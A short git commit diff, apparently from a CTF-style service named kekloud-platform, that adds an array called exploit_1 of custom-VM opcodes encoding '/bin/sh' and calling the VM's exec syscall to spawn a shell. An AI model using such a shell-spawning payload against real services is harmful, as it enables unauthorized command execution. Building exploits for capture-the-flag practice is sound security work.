ee24b92d0d8a4f788f544e497cb51a2ee389f659
keltecc <keltecc@ya.ru>
2019-09-11 12:50:32 +0500

    added first exploit

--- services/kekloud-platform/main.c
+++ services/kekloud-platform/main.c
@@ -5,12 +5,19 @@
 #include "vm/commands.h"
 
 
+int exploit_1[] = {OP_SET, 0, 0x6e69622f, OP_SET, 1, 0x0068732f, OP_SYS, SYS_EXEC};
+
+
 int main(int argc, char** argv, char** envp) {
     int result;
     vm_state_t vm_state;
 
-    int program[] = {OP_SET, 0, 0x6e69622f, OP_SET, 1, 0x68732f, OP_SET, REG_AX, 0, OP_SYS, SYS_EXEC};
+    int program[] = {};
 
     vm_init(&vm_state, program, sizeof(program) / sizeof(int));
     vm_execute(&vm_state, 1024, &result);
+
+    printf("%d %d %d\n", result, vm_state.vm_reg.AX, vm_state.vm_reg.BX);
+
+    return 0;
 }
